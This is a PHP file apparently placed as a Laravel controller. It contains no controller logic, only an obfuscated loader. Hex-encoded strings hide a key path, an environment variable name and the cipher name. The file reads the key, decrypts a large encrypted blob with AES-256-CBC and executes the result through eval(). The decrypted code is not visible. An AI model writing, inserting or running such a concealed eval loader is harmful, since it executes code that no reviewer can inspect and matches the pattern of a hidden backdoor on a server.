<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('d9rxPrEZ7wbuDOupFp2g+Q==');

$c=base64_decode(

'RjOQsluQingrUPb5LDq75y3fVZjFIZYBpxE57XgCJ1MrnVGvGyP1EKjOtunzdhjfaCT+aakDoIJd' .
'QCX3o95SUzut8v1UCtumazcHovm/Y/5Oh9NlLWP9YE6uJnSp+/YatmlVuQTky578DaEY06DrRgQx' .
'n6soMIj/0w7PCFnOYMNMSpH+frAdFs8zBFJcveMueRBPnS+Ew6WJUPIP704wkAZnWeu9VMY8z3fw' .
'8aCkJIyBZpLQfrJIesNtPJU/6LzTX1/n+4YAc9j9e7uaCSbyFIDRn6wSsEEeq3Io3Qj2Xd+RHGtk' .
'HELkWwragevwS6YgzoP6TZzW0a1nFAvqdE8bl/3o1rqF7S0rcsX2BnDdWPSxy9xPDsmmLyekWnFe' .
'N9u6CpQ30w/N4vp0WCngO79LO2c7gmPRERuP59NHKTzT18fvwFzhwcWnjRfiGFbLfKOX9cutliNw' .
'QWXCYm98mX7kURgfC7+i5mzCfXs4rEZC4AVJsbsTaEQWwIdNpxu+hHbzsVnPf0RfOTDaT22Apfc4' .
'YJUmSwTNU9mnvVwO+5xyQgQGXJbvncSWFgGEJ8HVzmQoCSW6JSavjAJ43EsmABNN4ol+BtCK/oIS' .
'hTvsnYPTOtrw+ZudTMLeNfGJpF5GuJlwG6fSsOzKXdcnHxauwTdfJ9ETzoeBy31M3zFKi6vOD4VP' .
'YTTJEEWwj/RccqUd+S79txZ7Tkj8zm3wnY3L+HPtiKYegmfYLza5MOwNQF8heEEQy0j4gksEoQAo' .
'anVggmsGyz1cYhODtSpARR4l/klhIsNOtd6BW4QYUnnlr9C1cKkfZWzt+NqXtbEwjMWsv7FDWRSt' .
'0Os/hpd3lsdkkbWaSd+qtCgcfHS7735oaez7JO62MiE9h2/Tqfcik+cm0hfBsBGSMZ4Ny1klutMB' .
'V76WX5O6Kn37afQBrcK2X7dgMr+q7KAG1XBezauXqcKT6klKo+hUFt1nSUhOrAMf60R/x8dRcqTg' .
'w4OKfBkOEaRzY5Nz7QD/yydll3mW9nMjbfg7u7+WwtOB3kfCnHM/dgTPtMgYCiBr+iVhCVQvN3Kd' .
'gtMH6T0nnLlBLtIKQRnNZ/QmSUriMUM9XHlHxX69EGvtlL7r36h4EKvK4b6SdNKQ1ey66rpjU8CJ' .
'iezwGo8JSNCsVM3UIpdo838TLH7XmKohvfbBmyczwmi0FAm+X54Fl0fodkELMYf0n10Q2PIneBlI' .
'QBE3wM7ZojspD+WeWF5GuoHFEwjZLRrkNMXXqbz4204GlnasgxjG9/qy8BTOai5++H0bvTpmvphY' .
'mNj0vr6hkMwto2VWgWYhbrl3SyEX0BMwVnjwQ8E6aXavbhn2uDKAfFWd10ku6IsxQagFYYyRWAsU' .
'wyY5TolLAIotJVLAVZ6u6FBoxIcdHuwVm9rbxxcFf6WOzent3Nf1WE88Clj9g4izyDKqlP2d64ER' .
'kcE8lp+hcFife/0WdcVCrPH3dLP/vR5k5cBr7ceZTmN4JJ0nCWsnycPmsFYEkNo/KrWUSrUn130+' .
'8ba+Q2n03eKV5/wc4737xjxC+YWDemkX9myP9VZo4Bqs+9gG0CzhxMW/eZMi7q1nWJHSOA8D34+N' .
'p4Qy0dB1G3F2+MNemXykLdZ2yjfTb5RfVJ0C1D9jVYSOc0lh52AhS6lGi+0S7orRfEn7orrh6Iw0' .
'W0jm0cL4WY6aa0BKWj0XW0gMP1Fi8Jzeob9+GuwxLx/EPvPkfceRmdvpL0mtd9v3sSfSPd/y/Rmm' .
'VOC4VeAwVPXuZ0cyGoMFIxhTrR7YaiEp/JPB+VgxuodTiVXaTt/QmiOh3VTa//hadzdNePae3CDV' .
'9VyUDeNkhwH8ghoIztCooMldOiNRGSXwPxITaeqWLgEmgVRBLhJMDXjTv4ToxRAqiP6jwSIiRG3T' .
'heRnPgR1ooQxF9LbJEpjEsiB7MIU/79NQI6n2U5COQsDGV1ElJzKYl2xj+P/jB17/0DftOX2pPqW' .
'sKeGDptB9F8Pk1JG/LPbSVaHEp8emRE9hD/+BQkHD7PyXv3F0dObswm5A2XSdvyejk58E+2lI/wy' .
'110hZe0uUkuzBu5yupp4LX4z2+YDoWHhenyYJqLH0Yu6d0fzmUAkcsvNcaXXwHoFMeuaVgbBteDb' .
'NSN+eKIPPzpTNMR+T/ATuV5NoVkfUbd9pgBg6iVPZ4e8r90hthWY593fsj1btnrqCRtoY+026fXa' .
'uRQ1uBGNDMFSpABuutv6xXHmYtMshZcNf361Uuy5NWIj0uLgN9DRJorbJDhLjx9I4D5xjDHAXBs3' .
'Gr11wOcX+YyQ87B4D9sJbCIcgZMmUZQm9K083NeIrEowJFn11p7yEGIaQM20v08d0iLiRD4jmJRb' .
'EkhZ0PtttdBRdZe9zki3nN4QTxi5iqM/jrE2Btx79+D0Ef5OJxsmcRqViORJ3HC5Fmk2E7SECn9b' .
'k+x4kdJ+bEssMRM5zH0jQF70gLrsoh7Yee3QwXMI7wepkbsx8sC/oW85AOMgT++nx26xn0BkIGp9' .
'gN6NF47fJIYUT13cbVaosDs2drKK4phU/Q48o97KMMEVi+Z/urMcNEHFCnmKUgv+4VahuGheV7Fo' .
'hSFZi9s/Fx2yxSTw5cogKPNPLlfQi6XK3b1h7wK2rRIaywRnUN4DPFdgn8bv/NN37IpNngiUvVRp' .
'RRS+hMxzY4lU04u2g72nmdOcJ6oRE9p6rpIqm/wf/wgD/hQ6TYKk8mWXNlxjlHf8/hb93JHkS4BX' .
'6FrxKuIALbgVMv+NHwsUx/nKhU9BgtGnAKn9cicpf5ys150IgxJpZ6cEak1UQEjXGRMrLMtqTE7q' .
'RREMSrYz3mpUAKCPYeKmvzlqr2Hna8kRYNysc/ra8V0Ryw1MowjFR5iiKFf01d6PR1GPxgWGVJsY' .
'h+4Qyt2cgCJdQODXQQ+SWcnuHA8dLo96DFTsScBkFuxZeNGoF9I7pcOS/GQdUdjyrpxdqvYl/BhR' .
'INIKbMKR1e51xa3YCHH50Km/17faJ37KbzSD4Y3qKCQiB58blZKnG0yc+62BGHU3h2keioMdiMvQ' .
'DPyFUliS5zkjH0tzRe0IQXXFZts5uU3hj5i0xggNI4xvVZ6Wg3b0odmvwtbOFZyKpKPkZwHolm1W' .
'zZuA49mwHu9/oF30MEk5EOtb+oZKaeSjRSx2HP1jGXqfv0kh5ycsTpVvoObjPx9rOrqv7L+LORfC' .
'8bhXLDRDhv7N/AM3b3+6V7z+Mu5G/ffNTxw3W288nWphEcb+pqxrSLG1QL6spGSLxbpVe4nI9r8l' .
'bLpI9V+GDoPzevLta4ouy7usRFTla8pO/t2HwYse+GVQcdEEPZwNyvNulTArVeT83dMbUcsrFC2G' .
'gr6F0jjxjP9pEPF7Fjhg1sWa1PulKjVlNRK6qBTCAi/N2fE1IF06uYG5ko3Z3lJTYcg7kcI/NjhE' .
'xNf1H+AD8Te2RUQUNh0riHK1yPRczqfrERMucrneuMMmAXGJEKD3Y0lDDwH3H/JexKXg3xN1gw2m' .
'TXLyeHhwKntaA9RI/aQH24fi'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

